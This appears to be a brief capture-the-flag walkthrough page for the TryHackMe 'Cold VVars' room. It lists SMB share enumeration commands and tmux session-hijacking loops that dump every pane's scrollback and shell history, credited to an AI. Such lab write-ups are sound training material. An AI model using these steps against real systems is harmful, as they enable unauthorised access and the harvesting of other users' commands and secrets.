## TryHackMe room Cold VVars https://tryhackme.com/room/coldvvars

### TryHackMe Cold VVars YouTube Video Walk Through: 

[TryHackMe Cold VVars - Full Walkthrough 2025](https://youtu.be/N4Ih0V7sc2o)

**Below commands used on TryHackMe room Cold VVars YouTube video walk through:**

```
smbclient -L //<target_ip> -N
enum4linux <target_ip>
smbclient   \\\\10.10.39.65\\SECURED -U ArthurMorgan

tmux ls
tmux attach -t 0
tmux list-windows -t 0          # List all windows in session 0
tmux send-keys -t 0:2 "whoami" Enter
tmux capture-pane -t 0:2 -p | tail -3
```

### Capture the scrollback buffer from each pane. code by Claudi Ai
```
for window in {0..8}; do
  num_panes=$(tmux list-panes -t 0:$window 2>/dev/null | wc -l)
  for ((pane=0; pane<num_panes; pane++)); do
    echo "=== Window $window, Pane $pane ==="
    # Capture last 1000 lines of scrollback
    tmux capture-pane -t 0:$window.$pane -p -S -1000
    echo ""
  done
done
```
### Send 'history' command to all panes: code by Claudi Ai
```
for window in {0..8}; do
  num_panes=$(tmux list-panes -t 0:$window 2>/dev/null | wc -l)
  for ((pane=0; pane<num_panes; pane++)); do
    echo "=== Window $window, Pane $pane ==="
    tmux send-keys -t 0:$window.$pane 'history' Enter
    sleep 0.5
    tmux capture-pane -t 0:$window.$pane -p | tail -20
  done
done
```
